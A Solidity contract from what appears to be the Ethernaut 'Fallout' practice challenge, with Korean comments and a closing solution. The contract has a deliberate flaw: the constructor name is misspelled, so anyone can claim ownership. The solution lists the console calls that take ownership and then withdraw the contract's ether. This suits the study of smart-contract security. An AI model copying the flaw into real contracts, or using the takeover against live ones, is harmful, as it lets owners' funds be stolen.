// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol"; // SafeMath 라이브러리 임포트 - 오버플로우 방지

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    } //constructor 오타로 인해 배포 시점에 호출되지 않음

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    } // sender에게 할당량 추가

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0); // 할당량이 0보다 큰지 확인
        allocator.transfer(allocations[allocator]);
    } // 할당량이 있는 allocator에게 이더 전송

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    } // 소유자만 컨트랙트 잔액 출금 가능

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    } // allocator의 할당량 조회
}

//풀이
//1. Fal1out 함수가 constructor로 인식되지 않아서 아무도 소유자가 되지 못함
//2. 따라서 누구든지 소유자가 될 수 있음
//3. await contract.Fal1out({value: web3.utils.toWei("1", "ether")}) 로 소유자 변경
//4. await contract.owner() 로 소유자 확인
//5. await contract.collectAllocations() 로 컨트랙트에 있는 이더 출금
//끝